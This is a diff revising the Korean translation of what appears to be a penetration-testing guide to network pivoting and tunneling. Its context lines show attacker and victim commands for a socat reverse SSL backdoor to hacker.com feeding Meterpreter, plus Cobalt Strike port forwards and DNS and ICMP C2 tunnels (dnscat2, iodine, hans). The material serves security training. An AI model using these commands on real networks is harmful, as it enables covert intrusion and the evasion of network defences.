@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐색을 비활성화**해야 합니다 (`-Pn`) 및 **TCP 스캔**을 지정해야 합니다 (`-sT`) 이 작업이 수행되도록 합니다.
+> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐지**를 **비활성화**해야 합니다 (`-Pn`) 그리고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
 
 ## **Bash**
 
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
+두 장치에서 **루트 권한이 필요합니다** (새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -154,13 +154,13 @@ To note:
 
 - Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
 - 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
-- **리버스 포트 포워드를 생성하는 데 관리자 권한이 필요하지 않습니다** 고포트에서.
+- **리버스 포트 포워드를 생성하는 데 관리자 권한이 필요하지 않습니다**.
 
 ### rPort2Port local
 
 > [!WARNING]
 > 이 경우, **포트는 비콘 호스트에서 열리며**, Team Server가 아니라 **트래픽은 Cobalt Strike 클라이언트로 전송됩니다** (Team Server가 아니라) 그리고 거기서 지정된 호스트:포트로 전송됩니다.
-```
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -237,7 +237,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-리버스 터널. 터널은 피해자에서 시작됩니다.\
+역방향 터널. 터널은 피해자에서 시작됩니다.\
 127.0.0.1:1080에 socks4 프록시가 생성됩니다.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -286,13 +286,13 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-당신은 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하여 **비인증 프록시**를 우회할 수 있습니다:
+이 줄을 희생자의 콘솔에서 마지막 줄 대신 실행하면 **비인증 프록시**를 우회할 수 있습니다:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### SSL Socat 터널
 
 **/bin/sh 콘솔**
 
@@ -331,7 +331,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-로컬 관리자가 되어야 합니다 (모든 포트에 대해)
+로컬 관리자여야 합니다 (모든 포트에 대해)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-프록시에 대해 인증하고 지정한 외부 서비스로 포트를 로컬에서 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
+프록시에 대해 인증하고 외부 서비스에 지정한 포트에 로컬로 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
 예를 들어 포트 443을 포워딩합니다.
 ```
 Username Alice
@@ -405,19 +405,19 @@ Microsoft에서 만든 리버스 프록시입니다. 여기에서 찾을 수 있
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-두 시스템 모두에서 tun 어댑터를 생성하고 DNS 쿼리를 사용하여 데이터 터널링을 수행하려면 루트 권한이 필요합니다.
+두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 DNS 쿼리를 사용하여 데이터 터널링을 수행합니다.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
+터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성하려면 다음을 사용하십시오:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**
+[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
 
 DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
 ```bash
@@ -440,11 +440,11 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Proxychains DNS 변경
+#### 프록시체인 DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다(하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
-## Go에서의 터널
+## Go의 터널
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -455,7 +455,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 soc
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 터널 어댑터를 생성하고 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -513,7 +513,7 @@ _필요한 경우 인증 및 TLS를 추가하는 것도 가능합니다._
 ```
 #### HTTP 호출 스니핑
 
-_XSS, SSRF, SSTI 등에 유용 ..._\
+_XSS, SSRF, SSTI 등에 유용..._\
 stdout 또는 HTTP 인터페이스에서 직접 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서.
 
 #### 내부 HTTP 서비스 터널링
